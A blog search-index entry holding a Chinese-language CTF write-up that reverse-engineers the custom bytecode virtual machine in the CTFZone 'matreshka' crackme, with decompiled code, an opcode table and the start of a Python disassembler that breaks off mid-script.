<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>大杂烩</title>
      <link href="/2022/09/21/Mixed01/"/>
      <url>/2022/09/21/Mixed01/</url>
      
        <content type="html"><![CDATA[<h2 id="CTFZone-matreshka"><a href="#CTFZone-matreshka" class="headerlink" title="CTFZone matreshka"></a>CTFZone matreshka</h2><blockquote><p>My friend from Russia brought me a doll, but there is something in it. Can you figure out what is this?</p><a download href="/archives/Mixed01/matreshka.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a></blockquote><p>运行程序提示输入flag，查看<code>sub_6810</code>，有一个巨大的switch-case，那么应该是个虚拟机：</p><p><img src="/pictures/Mixed01/01.png" alt="流程图"></p><p>但是看每个case调用的函数，基本是一大坨，很难判断代码的作用。先找一下虚拟机指令的位置，在<code>sub_12E0</code>中可以发现两段数据：<code>unk_8040</code>和<code>unk_81E0</code>，大小均已知。然后看看虚拟机是如何解析指令的，回到<code>sub_6810</code>，逐句分析switch前的代码，发现对a1指针取值的数据类型不同，猜测是一个C++对象的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6810</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  v2 = <span class="number">5</span>;</span><br><span class="line">  v4 = *(_WORD **)a1; <span class="comment">// 取了2个字节</span></span><br><span class="line">  v5 = *(_QWORD *)(a1 + <span class="number">24</span>); <span class="comment">// 取了8个字节</span></span><br><span class="line">  v6 = v4[<span class="number">13</span>]; <span class="comment">// 程序计数器</span></span><br><span class="line">  v7 = v6 + <span class="number">5</span>;</span><br><span class="line">  v8 = v6;</span><br><span class="line">  v9 = v6 &amp; <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">13</span>] = v7;</span><br><span class="line">  v10 = v8 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(<span class="keyword">unsigned</span> __int8 *)(v5 + v10);</span><br><span class="line">    <span class="keyword">if</span> ( v2 + v9 &lt;= <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 -= <span class="number">8</span>;</span><br><span class="line">    ++v10;</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 |= (<span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)((_DWORD)v11 &lt;&lt; v9) &gt;&gt; v9;</span><br><span class="line">      v2 += v9;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = v11 | (v1 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = ((<span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)((_DWORD)v11 &lt;&lt; v9) &gt;&gt; (<span class="number">8</span> - v2)) | (v1 &lt;&lt; v2);</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">char</span>)v1 )...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后分析while (1)后面的代码，并把断点下在<code>68A0</code>处验证，可以看出这些操作是从<code>v5</code>这个指针指向的数据（位偏移量是<code>v6</code>）中取出5个bit放入<code>v1</code>。5bit可以对应32个值，而switch中有25个case，那这个<code>v1</code>应该是操作码了。</p><p>然后我们分析每个case，先进入<code>sub_55D0</code>，虽然说代码很多，但分析后可以看出都是些固定的内联函数，忽略它们以后其实也没那么复杂<del>好吧，还是有点复杂的</del>。函数接受一个虚拟机对象指针，并且从指令流中继续读取3个bit存入<code>v4</code>，然后紧接着又是一个switch：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __fastcall <span class="title">sub_55D0</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v2 = <span class="number">3</span>;</span><br><span class="line">  v3 = *a1;</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = a1[<span class="number">3</span>];</span><br><span class="line">  v6 = *(_WORD *)(*a1 + <span class="number">26LL</span>);</span><br><span class="line">  v7 = v6 + <span class="number">3</span>;</span><br><span class="line">  *(_WORD *)(v3 + <span class="number">26</span>) = v6 + <span class="number">3</span>;</span><br><span class="line">  v8 = v6 &amp; <span class="number">7</span>;</span><br><span class="line">  v9 = v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  v10 = v8;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(<span class="keyword">unsigned</span> __int8 *)(v5 + v9);</span><br><span class="line">    <span class="keyword">if</span> ( v2 + v10 &lt;= <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 -= <span class="number">8</span>;</span><br><span class="line">    ++v9;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = (<span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)((_DWORD)v11 &lt;&lt; v10) &gt;&gt; v10;</span><br><span class="line">      v4 |= v11;</span><br><span class="line">      v2 += v10;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v11 | (v4 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = (<span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)((_DWORD)v11 &lt;&lt; v10) &gt;&gt; (<span class="number">8</span> - v2);</span><br><span class="line">  v4 = v11 | (v4 &lt;&lt; v2);</span><br><span class="line">  LABEL_7:</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3个bit对应8个case，每个case会继续从指令流中读取一些bit，先看看case 0：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">      v38 = v4;</span><br><span class="line">      v39 = v7 &amp; <span class="number">7</span>;</span><br><span class="line">      *(_WORD *)(v3 + <span class="number">26</span>) = v6 + <span class="number">7</span>;</span><br><span class="line">      v40 = (<span class="keyword">unsigned</span> __int16)(v6 + <span class="number">3</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">      v41 = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v42 = (<span class="keyword">unsigned</span> __int8 *)(v5 + v40);</span><br><span class="line">        <span class="keyword">if</span> ( v41 + v39 &lt;= <span class="number">8</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v41 -= <span class="number">8</span>;</span><br><span class="line">        ++v40;</span><br><span class="line">        <span class="keyword">if</span> ( v39 )</span><br><span class="line">        &#123;</span><br><span class="line">          v38 |= (<span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)(*v42 &lt;&lt; v39) &gt;&gt; v39;</span><br><span class="line">          v41 += v39;</span><br><span class="line">          <span class="keyword">if</span> ( !v41 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">          v39 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v38 = *v42 | (v38 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v41 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">          v39 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v38 = ((<span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)(*v42 &lt;&lt; v39) &gt;&gt; (<span class="number">8</span> - v41)) | (v38 &lt;&lt; v41);</span><br><span class="line">LABEL_73:</span><br><span class="line">      v73 = <span class="number">4</span>;</span><br><span class="line">      *(_WORD *)(v3 + <span class="number">26</span>) = v6 + <span class="number">11</span>;</span><br><span class="line">      v74 = ((_BYTE)v6 + <span class="number">7</span>) &amp; <span class="number">7</span>;</span><br><span class="line">      v75 = (<span class="keyword">unsigned</span> __int16)(v6 + <span class="number">7</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v76 = (<span class="keyword">unsigned</span> __int8 *)(v5 + v75);</span><br><span class="line">        <span class="keyword">if</span> ( v73 + v74 &lt;= <span class="number">8</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v73 -= <span class="number">8</span>;</span><br><span class="line">        ++v75;</span><br><span class="line">        <span class="keyword">if</span> ( v74 )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 |= (<span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)(*v76 &lt;&lt; v74) &gt;&gt; v74;</span><br><span class="line">          v73 += v74;</span><br><span class="line">          <span class="keyword">if</span> ( !v73 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_121;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v4 = *v76 | (v4 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v73 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_121;</span><br><span class="line">        &#125;</span><br><span class="line">        v74 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = ((<span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)(*v76 &lt;&lt; v74) &gt;&gt; (<span class="number">8</span> - v73)) | (v4 &lt;&lt; v73);</span><br><span class="line">LABEL_121:</span><br><span class="line">      LOWORD(v11) = *(_WORD *)(v3 + <span class="number">2LL</span> * (<span class="keyword">unsigned</span> __int8)v4);</span><br><span class="line">      *(_WORD *)(v3 + <span class="number">2LL</span> * (<span class="keyword">unsigned</span> __int8)v38) = v11;</span><br><span class="line">      <span class="keyword">return</span> v11;</span><br></pre></td></tr></table></figure><p>看着代码多，实际就两次取指令数据，每次取4个bit，分别放到v38和v4里面。然后进行赋值，类似于x86的mov指令。然后把8个case都分析一下，虚拟机对象的数据结构和函数的功能就可以大致推测出来了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vector_u16</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 *start;</span><br><span class="line">  <span class="keyword">unsigned</span> __int16 *end;</span><br><span class="line">  <span class="keyword">unsigned</span> __int16 *end_cap;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vector_u8</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *start;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *end;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *end_cap;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  vector_u16 regs; <span class="comment">// count: 16</span></span><br><span class="line">  vector_u8 mem;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 dummy; <span class="comment">// unknown field</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>把它们放入local types，便于后面的分析。然后就是体力活了，就是相当纯粹的逆向，把20多个指令都逆一下，可以得到下面的指令对应表：</p><div class="table-container"><table><thead><tr><th>指令</th><th>操作</th></tr></thead><tbody><tr><td><code>00000</code></td><td><code>halt</code></td></tr><tr><td><code>00001 000 x4 y4</code></td><td><code>mov reg:x, reg:y</code></td></tr><tr><td><code>00001 001 x4 y16</code></td><td><code>mov reg:x, y</code></td></tr><tr><td><code>00001 010 0 x4 y4</code></td><td><code>mov byte[reg:x], reg:y</code></td></tr><tr><td><code>00001 010 1 x4 y4</code></td><td><code>mov [reg:x], reg:y</code></td></tr><tr><td><code>00001 011 0 x4, y8</code></td><td><code>mov byte[reg:x], y</code></td></tr><tr><td><code>00001 011 1 x4 y16</code></td><td><code>mov [reg:x], y</code></td></tr><tr><td><code>00001 100 x4 y4</code></td><td><code>mov reg:x, byte[reg:y</code></td></tr><tr><td><code>00001 101 x4 y4</code></td><td><code>mov reg:x, [reg:y</code></td></tr><tr><td><code>00001 110 x4 y16</code></td><td><code>mov reg:x, byte[y</code></td></tr><tr><td><code>00001 111 x4 y16</code></td><td><code>mov reg:x, [y</code></td></tr><tr><td><code>00010 00 x4 y4</code></td><td><code>add reg:x, reg:y</code></td></tr><tr><td><code>00010 01 x4 y16</code></td><td><code>add reg:x, y</code></td></tr><tr><td><code>00010 10 1 x4 y4</code></td><td><code>add [reg:x], reg:y</code></td></tr><tr><td><code>00010 10 0 x4 y4</code></td><td><code>add byte[reg:x], reg:y</code></td></tr><tr><td><code>00010 11 1 x4 y16</code></td><td><code>add [reg:x], y</code></td></tr><tr><td><code>00010 11 0 x4 y8</code></td><td><code>add byte[reg:x], y</code></td></tr><tr><td><code>00011 00 x4 y4</code></td><td><code>sub reg:x, reg:y</code></td></tr><tr><td><code>00011 01 x4 y16</code></td><td><code>sub reg:x, y</code></td></tr><tr><td><code>00011 10 1 x4 y4</code></td><td><code>sub [reg:x], reg:y</code></td></tr><tr><td><code>00011 10 0 x4 y4</code></td><td><code>sub byte[reg:x], reg:y</code></td></tr><tr><td><code>00011 11 1 x4 y16</code></td><td><code>sub [reg:x], y</code></td></tr><tr><td><code>00011 11 0 x4 y8</code></td><td><code>sub byte[reg:x], y</code></td></tr><tr><td><code>00100 00 x4 y4</code></td><td><code>umul reg:x, reg:y</code></td></tr><tr><td><code>00100 01 x4 y16</code></td><td><code>umul reg:x, y</code></td></tr><tr><td><code>00100 10 1 x4 y4</code></td><td><code>umul [reg:x], reg:y</code></td></tr><tr><td><code>00100 10 0 x4 y4</code></td><td><code>umul byte[reg:x], reg:y</code></td></tr><tr><td><code>00100 11 1 x4 y16</code></td><td><code>umul [reg:x], y</code></td></tr><tr><td><code>00100 11 0 x4 y8</code></td><td><code>umul byte[reg:x], y</code></td></tr><tr><td><code>00101 00 x4 y4</code></td><td><code>udiv reg:x, reg:y</code></td></tr><tr><td><code>00101 01 x4 y16</code></td><td><code>udiv reg:x, y</code></td></tr><tr><td><code>00101 10 1 x4 y4</code></td><td><code>udiv [reg:x], reg:y</code></td></tr><tr><td><code>00101 10 0 x4 y4</code></td><td><code>udiv byte[reg:x], reg:y</code></td></tr><tr><td><code>00101 11 1 x4 y16</code></td><td><code>udiv [reg:x], y</code></td></tr><tr><td><code>00101 11 0 x4 y8</code></td><td><code>udiv byte[reg:x], y</code></td></tr><tr><td><code>00110 0 x4, y4</code></td><td><code>xor reg:x, reg:y</code></td></tr><tr><td><code>00110 1 0 x4 y8</code></td><td><code>xor reg:x, y</code></td></tr><tr><td><code>00110 1 1 x4 y16</code></td><td><code>xor reg:x, y</code></td></tr><tr><td><code>00111 0 x4, y4</code></td><td><code>and reg:x, reg:y</code></td></tr><tr><td><code>00111 1 0 x4 y8</code></td><td><code>and reg:x, y</code></td></tr><tr><td><code>00111 1 1 x4 y16</code></td><td><code>and reg:x, y</code></td></tr><tr><td><code>01000 0 x4, y4</code></td><td><code>or reg:x, reg:y</code></td></tr><tr><td><code>01000 1 0 x4 y8</code></td><td><code>or reg:x, y</code></td></tr><tr><td><code>01000 1 1 x4 y16</code></td><td><code>or reg:x, y</code></td></tr><tr><td><code>01001 0 x4 y4</code></td><td><code>cmp reg:x, reg:y</code></td></tr><tr><td><code>01001 1 x4, y16</code></td><td><code>cmp reg:x, y</code></td></tr><tr><td><code>01010 0 x4</code></td><td><code>jmp reg:x</code></td></tr><tr><td><code>01010 1 x16</code></td><td><code>jmp x</code></td></tr><tr><td><code>01011 0 x4</code></td><td><code>jae reg:x</code></td></tr><tr><td><code>01011 1 x16</code></td><td><code>jae x</code></td></tr><tr><td><code>01100 0 x4</code></td><td><code>jbe reg:x</code></td></tr><tr><td><code>01100 1 x16</code></td><td><code>jbe x</code></td></tr><tr><td><code>01101 0 x4</code></td><td><code>ja reg:x</code></td></tr><tr><td><code>01101 1 x16</code></td><td><code>ja x</code></td></tr><tr><td><code>01110 0 x4</code></td><td><code>jb reg:x</code></td></tr><tr><td><code>01110 1 x16</code></td><td><code>jb x</code></td></tr><tr><td><code>01111 0 x4</code></td><td><code>push reg:x</code></td></tr><tr><td><code>01111 1 x16</code></td><td><code>push x</code></td></tr><tr><td><code>10000 x4</code></td><td><code>pop reg:x</code></td></tr><tr><td><code>10001</code></td><td><code>syscall</code></td></tr><tr><td><code>10010 0 x4</code></td><td><code>call reg:x</code></td></tr><tr><td><code>10010 1 x16</code></td><td><code>call x</code></td></tr><tr><td><code>10011</code></td><td><code>ret</code></td></tr><tr><td><code>10100 0 x4</code></td><td><code>jnz reg:x</code></td></tr><tr><td><code>10100 1 x16</code></td><td><code>jnz x</code></td></tr><tr><td><code>10101 0 x4</code></td><td><code>jz reg:x</code></td></tr><tr><td><code>10101 1 x16</code></td><td><code>jz x</code></td></tr><tr><td><code>10110</code></td><td><code>enter</code></td></tr><tr><td><code>10111</code></td><td><code>leave</code></td></tr><tr><td><code>11000</code></td><td><code>nop</code></td></tr><tr><td><code>11001</code></td><td><code>nop</code></td></tr></tbody></table></div><p>其中<code>x4</code>代表<code>x</code>是一个4位整数；<code>reg:x</code>代表x号寄存器，如<code>r0</code>；独立的<code>x</code>代表立即数；<code>[x]</code>代表地址<code>x</code>处的值。<code>syscall</code>看着吓人，实际就两个功能：读取输入缓冲区和写到输出缓冲区（其实还有一个分支，但没有被用到）。</p><p>在逆的过程中，一些寄存器的含义也能猜测出来：</p><div class="table-container"><table><thead><tr><th>寄存器</th><th>对应x86的寄存器</th><th>含义</th></tr></thead><tbody><tr><td><code>r11</code></td><td><code>rbp</code></td><td>栈底指针</td></tr><tr><td><code>r12</code></td><td><code>rsp</code></td><td>栈顶指针</td></tr><tr><td><code>r13</code></td><td><code>rip</code></td><td>程序计数器</td></tr><tr><td><code>r14</code></td><td><code>rdx</code></td><td>存放除法指令的余数</td></tr><tr><td><code>r15</code></td><td><code>rflags</code></td><td>标志寄存器（0:ZF(<code>op1==op2</code>), 1:SF(<code>op1&lt;op2</code>)）</td></tr></tbody></table></div><p>我们可以写个脚本，把指令流转化成人类可读的格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bitstring</span><br><span class="line"></span><br><span class="line">bits = <span class="built_in">open</span>(<span class="string">&#x27;mem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">bits = bitstring.Bits(bits)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dism</span>(<span class="params">bits, addr</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operand</span>(<span class="params">addr, <span class="built_in">len</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span> == <span class="number">4</span>:</span><br><span class="line">            opr = bits[addr:addr+<span class="number">4</span>].uint</span><br><span class="line">            <span class="keyword">if</span> opr &lt; <span class="number">11</span>: <span class="keyword">return</span> <span class="string">&#x27;r%d&#x27;</span> % opr</span><br><span class="line">            <span class="keyword">else</span>: <span class="keyword">return</span> (<span class="string">&#x27;rbp&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="string">&#x27;rip&#x27;</span>, <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;flags&#x27;</span>)[opr - <span class="number">11</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span> <span class="keyword">in</span> (<span class="number">8</span>, <span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0x%X&#x27;</span> % bits[addr:addr+<span class="built_in">len</span>].uint</span><br><span class="line"></span><br><span class="line">    op = bits[addr:addr+<span class="number">5</span>].uint</span><br><span class="line">    addr += <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">        ops = bits[addr:addr+<span class="number">3</span>].uint</span><br><span class="line">        addr += <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> ops == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;mov %s, %s&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;mov %s, %s&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">16</span>)), addr + <span class="number">20</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">2</span>:</span><br><span class="line">            opss = bits[addr:addr+<span class="number">1</span>].uint</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> opss == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;mov byte[%s], %s&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;mov [%s], %s&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">3</span>:</span><br><span class="line">            opss = bits[addr:addr+<span class="number">1</span>].uint</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> opss == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;mov byte[%s], %s&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">8</span>)), addr + <span class="number">12</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;mov [%s], %s&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">16</span>)), addr + <span class="number">20</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;mov %s, byte[%s]&#x27;</span> % (operand(addr, <span class="number">4</span>), 